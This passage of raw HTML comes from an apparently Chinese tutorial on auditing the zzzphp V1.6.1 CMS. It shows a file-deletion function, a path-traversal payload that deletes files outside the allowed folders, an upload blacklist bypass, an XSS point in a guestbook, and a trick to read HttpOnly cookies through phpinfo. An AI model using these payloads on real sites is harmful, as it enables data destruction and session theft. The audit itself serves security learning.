src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/21_OqiaIczUkDqxgXU4YtMECj3GABy4Lw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIDu1soG1hp6SrgaOxt0RlnbV9POqiaIczUkDqxgXU4YtMECj3GABy4Lw/640?wx_fmt=png'" data-type="png" data-w="549" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">function</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> delfile</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(){</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    $file</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getform</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'path'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'post'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">       </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    $file_path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">file_path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$file</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    $safe_path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">array</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'upload'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'template'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'runtime'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'backup'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">if</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arr_search</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$file_path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$safe_path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)){</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        $file</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$_SERVER</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'DOCUMENT_ROOT'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">].</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$file</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">return</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> del_file</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$file</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到得到path，然后找到地址然后判断路径是否包含safe_path里面的值，如果包含就得到地址然后返回del_file()函数，跟进一下</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.37948717948717947" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/22_W6rtJ5kVGCgibdksic2usrT4Pmia1A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIic77iaD7cBkB4zicBItv2BjhowoKMOW6rtJ5kVGCgibdksic2usrT4Pmia1A/640?wx_fmt=png'" data-type="png" data-w="780" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">跟进下ifstrin函数</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.29338103756708406" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/23_pVJBUHS212ql0ddbynAGbF71WncFOg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIicFHQYDjkCxuOmKoib9NdQkqLqpVJBUHS212ql0ddbynAGbF71WncFOg/640?wx_fmt=png'" data-type="png" data-w="559" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到就是做了简单验证</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5358004827031375" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/24_HUhp6SAiadQ8NOrOeOO1ickwOmiaow.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIHnALVrraIQu7KaK9tYGFASQG9sDHUhp6SAiadQ8NOrOeOO1ickwOmiaow/640?wx_fmt=png'" data-type="png" data-w="1243" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">payload POST /cms/zzzphpV1.6.1/admin178/save.php?act=delfile path=/cms/zzzphpV1.6.1/template/../install/1.txt</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x04 文件上传 同样先找个上传点</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.36538461538461536" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/25_I0HqgyfgqajTnT1s5SVia9BEurypCw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfSFUplhwwuLUs13FHta6txN3DI0HqgyfgqajTnT1s5SVia9BEurypCw/640?wx_fmt=png'" data-type="png" data-w="468" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到请求的是save.php然后act参数为upload save.php?act=upload&amp;uptype=image&amp;upfolder=news</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.23667377398720682" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/26_hJt51KvcMdB4z4JibZuEwrMawoH1xg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgbUIopibVQ9y7qUEdyVLw0nVEahJt51KvcMdB4z4JibZuEwrMawoH1xg/640?wx_fmt=png'" data-type="png" data-w="469" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">跟进一下up_load()函数</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4125766871165644" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/27_RBmPM8kcl1XHIZWxJyUkiaZ732ySGw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaISfLdNhds0aibpmTrVtl2gSCnTicRBmPM8kcl1XHIZWxJyUkiaZ732ySGw/640?wx_fmt=png'" data-type="png" data-w="652" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里没有做判断然后就调用upload函数来上传这里来看下这个函数</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6254136333553938" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/28_OvAR7yiaPyhiaxn7jgKkNjK0npv5ZA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI9ojuxRnqBzNPocA5J0FTyXXUKGOvAR7yiaPyhiaxn7jgKkNjK0npv5ZA/640?wx_fmt=png'" data-type="png" data-w="1511" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到就是个黑名单验证</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6628242074927954" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/29_lNZ1eKKct7OHcVicnRc0bVHxrDYyTQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIqqS14XiaMEQDlQEGcVWuQJcHaglNZ1eKKct7OHcVicnRc0bVHxrDYyTQ/640?wx_fmt=png'" data-type="png" data-w="694" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">添加一个asa</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.39144736842105265" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/30_IhmpENekiaXPtIxPveeEBBvkadYxwg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgmCNlFqWLh4bfLhgpvLExrmz2IhmpENekiaXPtIxPveeEBBvkadYxwg/640?wx_fmt=png'" data-type="png" data-w="912" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x05 xss 这里我们找到个留言板抓包</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6007246376811595" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/31_C7ias6D7OtrVNXWAKxg2EfKdN75bjQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIhIrshMKkjjGRsDibCTicLpnKZNeC7ias6D7OtrVNXWAKxg2EfKdN75bjQ/640?wx_fmt=png'" data-type="png" data-w="1380" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8453410182516811" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/32_0jJhkpQlnWV3D4swkia3UPGowxE29A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI0AVgnw53N4Hg3M4YUZQ1mfF730jJhkpQlnWV3D4swkia3UPGowxE29A/640?wx_fmt=png'" data-type="png" data-w="1041" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">我们可以看到除了content都没过滤，找个其他的地方插进去就可以了</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.33976833976833976" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/33_plLHciaEII6aA8UD9sR4DRxOLLibAw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI3e492awwueibCicdHSV0dhdpQugWplLHciaEII6aA8UD9sR4DRxOLLibAw/640?wx_fmt=png'" data-type="png" data-w="518" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">###5.1 存在httponly，扩大化利用 我们都知道如果存在httponly就无法打到cookie，但是如果页面存在phpinfo的话就可以，为什么呢，这里来看下一个phpinfo的页面</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.19700460829493088" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/34_ia9LcHEsicRhRnaTt5ldcWia6JVZdQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIMP6RicXLiaFq5V2Ip9NCO1CDmiaPA0ia9LcHEsicRhRnaTt5ldcWia6JVZdQ/640?wx_fmt=png'" data-type="png" data-w="868" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这知道了把，跳转用户访问phpinfo然后抓取里面的值就可以了</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x06 csrf 如何判断是否存在CSRF漏洞？1. 判断是否验证Referer 2. 判断是否验证Token 3. 判断是否拥有Header头部验证</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里源码有点问题，就大概讲一下一些技巧首先就是自动加载可以添加一下代码</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: 